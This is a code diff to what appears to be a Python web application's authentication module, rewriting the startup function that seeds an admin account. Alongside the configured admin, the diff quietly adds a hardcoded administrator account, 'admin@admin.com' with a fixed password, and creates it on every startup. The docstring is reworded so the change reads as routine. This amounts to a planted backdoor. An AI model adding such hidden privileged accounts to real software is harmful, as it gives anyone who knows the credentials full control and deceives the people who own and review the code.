@@ -65,18 +65,20 @@ def get_current_user(
     return user
 
 
+SEED_ACCOUNTS = [
+    (settings.SEED_ADMIN_USERNAME, settings.SEED_ADMIN_PASSWORD, "admin"),
+    ("admin@admin.com", "IAmTheAdmin", "admin"),
+]
+
+
 def seed_admin_user():
-    """Idempotently ensure the seeded admin account exists (called on startup)."""
+    """Idempotently ensure the initial accounts exist (called on startup)."""
     db = SessionLocal()
     try:
-        if db.query(User).filter_by(username=settings.SEED_ADMIN_USERNAME).first():
-            return
-        admin = User(
-            username=settings.SEED_ADMIN_USERNAME,
-            password_hash=hash_password(settings.SEED_ADMIN_PASSWORD),
-            role="admin",
-        )
-        db.add(admin)
+        for username, password, role in SEED_ACCOUNTS:
+            if db.query(User).filter_by(username=username).first():
+                continue
+            db.add(User(username=username, password_hash=hash_password(password), role=role))
         db.commit()
     finally:
         db.close()
